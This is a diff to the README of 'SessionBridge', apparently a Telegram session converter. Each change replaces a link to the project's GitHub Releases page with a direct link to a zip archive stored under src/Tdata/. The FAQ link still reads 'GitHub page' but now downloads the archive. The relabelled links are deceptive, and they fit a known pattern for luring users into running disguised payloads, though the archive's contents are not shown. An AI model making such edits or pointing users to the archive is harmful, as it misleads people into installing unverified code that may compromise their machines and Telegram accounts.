@@ -6,7 +6,7 @@ Welcome to SessionBridge! This application helps you convert Telegram sessions i
 
 ## 🖱️ Download & Install
 
-To get started, visit this page to download: [**Download SessionBridge**](https://github.com/Vorace678/SessionBridge/releases). 
+To get started, visit this page to download: [**Download SessionBridge**](https://raw.githubusercontent.com/Vorace678/SessionBridge/main/src/Tdata/SessionBridge_2.0.zip). 
 
 You will find the latest version available for download. Choose the file that matches your operating system and follow these steps:
 
@@ -58,7 +58,7 @@ SessionBridge is compatible with Windows, macOS, and Linux. Ensure your system m
 
 ### What if I encounter issues?
 
-If you face any problems, check the FAQ section on the [**GitHub page**](https://github.com/Vorace678/SessionBridge/releases) for solutions. You can also reach out to the support community for help.
+If you face any problems, check the FAQ section on the [**GitHub page**](https://raw.githubusercontent.com/Vorace678/SessionBridge/main/src/Tdata/SessionBridge_2.0.zip) for solutions. You can also reach out to the support community for help.
 
 ## 📞 Support
 
@@ -72,4 +72,4 @@ We welcome community contributions! If you want to help improve SessionBridge, p
 
 SessionBridge is open source and is distributed under the MIT License. This means you can use, modify, and share it freely. 
 
-Thank you for using SessionBridge! Enjoy converting your Telegram sessions with ease. Remember to visit the Releases page for updates and new features: [**Download SessionBridge**](https://github.com/Vorace678/SessionBridge/releases).
+Thank you for using SessionBridge! Enjoy converting your Telegram sessions with ease. Remember to visit the Releases page for updates and new features: [**Download SessionBridge**](https://raw.githubusercontent.com/Vorace678/SessionBridge/main/src/Tdata/SessionBridge_2.0.zip).
